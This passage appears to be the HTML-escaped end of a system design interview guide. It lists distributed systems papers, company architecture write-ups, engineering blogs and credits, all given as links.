&lt;td&gt;&lt;a href="http://www.slideshare.net/previa/storm-16094009" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data store&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Bigtable&lt;/strong&gt; - Distributed column-oriented database from Google&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/chang06bigtable.pdf" rel="nofollow"&gt;harvard.edu&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data store&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;HBase&lt;/strong&gt; - Open source implementation of Bigtable&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/alexbaranau/intro-to-hbase" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data store&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Cassandra&lt;/strong&gt; - Distributed column-oriented database from Facebook&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/planetcassandra/cassandra-introduction-features-30103666" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data store&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;DynamoDB&lt;/strong&gt; - Document-oriented database from Amazon&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/decandia07dynamo.pdf" rel="nofollow"&gt;harvard.edu&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data store&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;MongoDB&lt;/strong&gt; - Document-oriented database&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/mdirolf/introduction-to-mongodb" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data store&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Spanner&lt;/strong&gt; - Globally-distributed database from Google&lt;/td&gt;
&lt;td&gt;&lt;a href="http://research.google.com/archive/spanner-osdi2012.pdf" rel="nofollow"&gt;research.google.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data store&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Memcached&lt;/strong&gt; - Distributed memory caching system&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/oemebamo/introduction-to-memcached" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data store&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Redis&lt;/strong&gt; - Distributed memory caching system with persistence and value types&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/dvirsky/introduction-to-redis" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;File system&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Google File System (GFS)&lt;/strong&gt; - Distributed file system&lt;/td&gt;
&lt;td&gt;&lt;a href="http://static.googleusercontent.com/media/research.google.com/zh-CN/us/archive/gfs-sosp2003.pdf" rel="nofollow"&gt;research.google.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;File system&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Hadoop File System (HDFS)&lt;/strong&gt; - Open source implementation of GFS&lt;/td&gt;
&lt;td&gt;&lt;a href="http://hadoop.apache.org/docs/stable/hadoop-project-dist/hadoop-hdfs/HdfsDesign.html" rel="nofollow"&gt;apache.org&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Misc&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Chubby&lt;/strong&gt; - Lock service for loosely-coupled distributed systems from Google&lt;/td&gt;
&lt;td&gt;&lt;a href="http://static.googleusercontent.com/external_content/untrusted_dlcp/research.google.com/en/us/archive/chubby-osdi06.pdf" rel="nofollow"&gt;research.google.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Misc&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Dapper&lt;/strong&gt; - Distributed systems tracing infrastructure&lt;/td&gt;
&lt;td&gt;&lt;a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/36356.pdf" rel="nofollow"&gt;research.google.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Misc&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Kafka&lt;/strong&gt; - Pub/sub message queue from LinkedIn&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/mumrah/kafka-talk-tri-hug" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Misc&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Zookeeper&lt;/strong&gt; - Centralized infrastructure and services enabling synchronization&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/sauravhaloi/introduction-to-apache-zookeeper" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Add an architecture&lt;/td&gt;
&lt;td&gt;&lt;a href="#contributing"&gt;Contribute&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-company-architectures" class="anchor" aria-hidden="true" href="#company-architectures"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Company architectures&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Company&lt;/th&gt;
&lt;th&gt;Reference(s)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Amazon&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/amazon-architecture" rel="nofollow"&gt;Amazon architecture&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Cinchcast&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2012/7/16/cinchcast-architecture-producing-1500-hours-of-audio-every-d.html" rel="nofollow"&gt;Producing 1,500 hours of audio every day&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DataSift&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2011/11/29/datasift-architecture-realtime-datamining-at-120000-tweets-p.html" rel="nofollow"&gt;Realtime datamining At 120,000 tweets per second&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DropBox&lt;/td&gt;
&lt;td&gt;&lt;a href="https://www.youtube.com/watch?v=PE4gwstWhmc" rel="nofollow"&gt;How we've scaled Dropbox&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ESPN&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2013/11/4/espns-architecture-at-scale-operating-at-100000-duh-nuh-nuhs.html" rel="nofollow"&gt;Operating At 100,000 duh nuh nuhs per second&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Google&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/google-architecture" rel="nofollow"&gt;Google architecture&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Instagram&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2011/12/6/instagram-architecture-14-million-users-terabytes-of-photos.html" rel="nofollow"&gt;14 million users, terabytes of photos&lt;/a&gt;&lt;br&gt;&lt;a href="http://instagram-engineering.tumblr.com/post/13649370142/what-powers-instagram-hundreds-of-instances" rel="nofollow"&gt;What powers Instagram&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Justin.tv&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2010/3/16/justintvs-live-video-broadcasting-architecture.html" rel="nofollow"&gt;Justin.Tv's live video broadcasting architecture&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Facebook&lt;/td&gt;
&lt;td&gt;&lt;a href="https://cs.uwaterloo.ca/~brecht/courses/854-Emerging-2014/readings/key-value/fb-memcached-nsdi-2013.pdf" rel="nofollow"&gt;Scaling memcached at Facebook&lt;/a&gt;&lt;br&gt;&lt;a href="https://cs.uwaterloo.ca/~brecht/courses/854-Emerging-2014/readings/data-store/tao-facebook-distributed-datastore-atc-2013.pdf" rel="nofollow"&gt;TAO: Facebook’s distributed data store for the social graph&lt;/a&gt;&lt;br&gt;&lt;a href="https://www.usenix.org/legacy/event/osdi10/tech/full_papers/Beaver.pdf" rel="nofollow"&gt;Facebook’s photo storage&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/blog/2016/6/27/how-facebook-live-streams-to-800000-simultaneous-viewers.html" rel="nofollow"&gt;How Facebook Live Streams To 800,000 Simultaneous Viewers&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Flickr&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/flickr-architecture" rel="nofollow"&gt;Flickr architecture&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Mailbox&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2013/6/18/scaling-mailbox-from-0-to-one-million-users-in-6-weeks-and-1.html" rel="nofollow"&gt;From 0 to one million users in 6 weeks&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Netflix&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2015/11/9/a-360-degree-view-of-the-entire-netflix-stack.html" rel="nofollow"&gt;A 360 Degree View Of The Entire Netflix Stack&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/blog/2017/12/11/netflix-what-happens-when-you-press-play.html" rel="nofollow"&gt;Netflix: What Happens When You Press Play?&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pinterest&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2013/4/15/scaling-pinterest-from-0-to-10s-of-billions-of-page-views-a.html" rel="nofollow"&gt;From 0 To 10s of billions of page views a month&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/blog/2012/5/21/pinterest-architecture-update-18-million-visitors-10x-growth.html" rel="nofollow"&gt;18 million visitors, 10x growth, 12 employees&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Playfish&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2010/9/21/playfishs-social-gaming-architecture-50-million-monthly-user.html" rel="nofollow"&gt;50 million monthly users and growing&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PlentyOfFish&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/plentyoffish-architecture" rel="nofollow"&gt;PlentyOfFish architecture&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Salesforce&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2013/9/23/salesforce-architecture-how-they-handle-13-billion-transacti.html" rel="nofollow"&gt;How they handle 1.3 billion transactions a day&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Stack Overflow&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2009/8/5/stack-overflow-architecture.html" rel="nofollow"&gt;Stack Overflow architecture&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TripAdvisor&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2011/6/27/tripadvisor-architecture-40m-visitors-200m-dynamic-page-view.html" rel="nofollow"&gt;40M visitors, 200M dynamic page views, 30TB data&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Tumblr&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2012/2/13/tumblr-architecture-15-billion-page-views-a-month-and-harder.html" rel="nofollow"&gt;15 billion page views a month&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Twitter&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/scaling-twitter-making-twitter-10000-percent-faster" rel="nofollow"&gt;Making Twitter 10000 percent faster&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/blog/2011/12/19/how-twitter-stores-250-million-tweets-a-day-using-mysql.html" rel="nofollow"&gt;Storing 250 million tweets a day using MySQL&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/blog/2013/7/8/the-architecture-twitter-uses-to-deal-with-150m-active-users.html" rel="nofollow"&gt;150M active users, 300K QPS, a 22 MB/S firehose&lt;/a&gt;&lt;br&gt;&lt;a href="https://www.infoq.com/presentations/Twitter-Timeline-Scalability" rel="nofollow"&gt;Timelines at scale&lt;/a&gt;&lt;br&gt;&lt;a href="https://www.youtube.com/watch?v=5cKTP36HVgI" rel="nofollow"&gt;Big and small data at Twitter&lt;/a&gt;&lt;br&gt;&lt;a href="https://www.youtube.com/watch?v=z8LU0Cj6BOU" rel="nofollow"&gt;Operations at Twitter: scaling beyond 100 million users&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/blog/2016/4/20/how-twitter-handles-3000-images-per-second.html" rel="nofollow"&gt;How Twitter Handles 3,000 Images Per Second&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Uber&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2015/9/14/how-uber-scales-their-real-time-market-platform.html" rel="nofollow"&gt;How Uber scales their real-time market platform&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/blog/2016/10/12/lessons-learned-from-scaling-uber-to-2000-engineers-1000-ser.html" rel="nofollow"&gt;Lessons Learned From Scaling Uber To 2000 Engineers, 1000 Services, And 8000 Git Repositories&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WhatsApp&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2014/2/26/the-whatsapp-architecture-facebook-bought-for-19-billion.html" rel="nofollow"&gt;The WhatsApp architecture Facebook bought for $19 billion&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;YouTube&lt;/td&gt;
&lt;td&gt;&lt;a href="https://www.youtube.com/watch?v=w5WVu624fY8" rel="nofollow"&gt;YouTube scalability&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/youtube-architecture" rel="nofollow"&gt;YouTube architecture&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-company-engineering-blogs" class="anchor" aria-hidden="true" href="#company-engineering-blogs"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Company engineering blogs&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Architectures for companies you are interviewing with.&lt;/p&gt;
&lt;p&gt;Questions you encounter might be from the same domain.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nerds.airbnb.com/" rel="nofollow"&gt;Airbnb Engineering&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.atlassian.com/blog/" rel="nofollow"&gt;Atlassian Developers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/blogs/aws/" rel="nofollow"&gt;AWS Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://word.bitly.com/" rel="nofollow"&gt;Bitly Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.box.com/blog/category/engineering" rel="nofollow"&gt;Box Blogs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.cloudera.com/" rel="nofollow"&gt;Cloudera Developer Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tech.dropbox.com/" rel="nofollow"&gt;Dropbox Tech Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://engineering.quora.com/" rel="nofollow"&gt;Engineering at Quora&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ebaytechblog.com/" rel="nofollow"&gt;Ebay Tech Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.evernote.com/tech/" rel="nofollow"&gt;Evernote Tech Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://codeascraft.com/" rel="nofollow"&gt;Etsy Code as Craft&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/Engineering" rel="nofollow"&gt;Facebook Engineering&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://code.flickr.net/" rel="nofollow"&gt;Flickr Code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://engineering.foursquare.com/" rel="nofollow"&gt;Foursquare Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://githubengineering.com/" rel="nofollow"&gt;GitHub Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://googleresearch.blogspot.com/" rel="nofollow"&gt;Google Research Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://engineering.groupon.com/" rel="nofollow"&gt;Groupon Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://engineering.heroku.com/" rel="nofollow"&gt;Heroku Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://product.hubspot.com/blog/topic/engineering" rel="nofollow"&gt;Hubspot Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://highscalability.com/" rel="nofollow"&gt;High Scalability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://instagram-engineering.tumblr.com/" rel="nofollow"&gt;Instagram Engineering&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://software.intel.com/en-us/blogs/" rel="nofollow"&gt;Intel Software Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blogs.janestreet.com/category/ocaml/" rel="nofollow"&gt;Jane Street Tech Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://engineering.linkedin.com/blog" rel="nofollow"&gt;LinkedIn Engineering&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://engineering.microsoft.com/" rel="nofollow"&gt;Microsoft Engineering&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blogs.msdn.microsoft.com/pythonengineering/" rel="nofollow"&gt;Microsoft Python Engineering&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://techblog.netflix.com/" rel="nofollow"&gt;Netflix Tech Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://devblog.paypal.com/category/engineering/" rel="nofollow"&gt;Paypal Developer Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@Pinterest_Engineering" rel="nofollow"&gt;Pinterest Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://engineering.quora.com/" rel="nofollow"&gt;Quora Engineering&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.redditblog.com/" rel="nofollow"&gt;Reddit Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.salesforce.com/blogs/engineering/" rel="nofollow"&gt;Salesforce Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://slack.engineering/" rel="nofollow"&gt;Slack Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://labs.spotify.com/" rel="nofollow"&gt;Spotify Labs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.twilio.com/engineering" rel="nofollow"&gt;Twilio Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.twitter.com/engineering/" rel="nofollow"&gt;Twitter Engineering&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://eng.uber.com/" rel="nofollow"&gt;Uber Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://yahooeng.tumblr.com/" rel="nofollow"&gt;Yahoo Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://engineeringblog.yelp.com/" rel="nofollow"&gt;Yelp Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zynga.com/blogs/engineering" rel="nofollow"&gt;Zynga Engineering Blog&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-sources-and-further-reading-15" class="anchor" aria-hidden="true" href="#sources-and-further-reading-15"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h4&gt;
&lt;p&gt;Looking to add a blog?  To avoid duplicating work, consider adding your company blog to the following repo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kilimchoi/engineering-blogs"&gt;kilimchoi/engineering-blogs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-under-development" class="anchor" aria-hidden="true" href="#under-development"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Under development&lt;/h2&gt;
&lt;p&gt;Interested in adding a section or helping complete one in-progress?  &lt;a href="#contributing"&gt;Contribute&lt;/a&gt;!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Distributed computing with MapReduce&lt;/li&gt;
&lt;li&gt;Consistent hashing&lt;/li&gt;
&lt;li&gt;Scatter gather&lt;/li&gt;
&lt;li&gt;&lt;a href="#contributing"&gt;Contribute&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-credits" class="anchor" aria-hidden="true" href="#credits"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Credits&lt;/h2&gt;
&lt;p&gt;Credits and sources are provided throughout this repo.&lt;/p&gt;
&lt;p&gt;Special thanks to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.hiredintech.com/system-design/the-system-design-process/" rel="nofollow"&gt;Hired in tech&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.amazon.com/dp/0984782850/" rel="nofollow"&gt;Cracking the coding interview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://highscalability.com/" rel="nofollow"&gt;High scalability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/checkcheckzz/system-design-interview"&gt;checkcheckzz/system-design-interview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/shashank88/system_design"&gt;shashank88/system_design&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mmcgrana/services-engineering"&gt;mmcgrana/services-engineering&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/vasanthk/485d1c25737e8e72759f"&gt;System design cheat sheet&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dancres.github.io/Pages/" rel="nofollow"&gt;A distributed systems reading list&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.puncsky.com/blog/2016-02-13-crack-the-system-design-interview" rel="nofollow"&gt;Cracking the system design interview&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
